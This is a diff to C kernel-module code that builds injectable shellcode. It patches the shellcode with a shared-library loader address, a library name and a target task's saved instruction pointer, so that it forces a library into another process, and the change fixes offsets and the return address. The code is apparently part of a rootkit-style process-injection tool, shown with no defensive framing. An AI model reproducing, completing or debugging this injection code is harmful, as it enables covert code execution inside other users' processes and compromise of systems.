@@ -157,15 +157,15 @@ ssize_t mem_write(struct task_struct* task, char *buf, size_t count, unsigned lo
 
 void* get_shellcode(size_t* shellcode_size, struct pt_regs* registers, unsigned long so_library_name, unsigned long load_so_function) {
 	void* shellcode_patched;
+	unsigned long ip = registers->ip - 2;
 	*shellcode_size = (unsigned long)end_of_shellcode - (unsigned long)shellcode;
 	if (0 >= *shellcode_size){
 		return NULL;
 	}
 	shellcode_patched = kmalloc(*shellcode_size, GFP_KERNEL);
 	memcpy(shellcode_patched, shellcode, *shellcode_size);
-	memcpy(shellcode_patched + 16, (void*)&load_so_function, sizeof(unsigned long));
-	memcpy(shellcode_patched + 26, (void*)&so_library_name, sizeof(unsigned long));
-	memcpy(shellcode_patched + 58, (void*)&registers->ip, sizeof(unsigned long) / 2);
-	memcpy(shellcode_patched + 63, (void*)&registers->ip + sizeof(unsigned long) / 2, sizeof(unsigned long) / 2);
+	memcpy(shellcode_patched + 39, (void*)&load_so_function, sizeof(unsigned long));
+	memcpy(shellcode_patched + 49, (void*)&so_library_name, sizeof(unsigned long));
+	memcpy(shellcode_patched + 99, (void*)&ip , sizeof(unsigned long));
 	return shellcode_patched;
 }
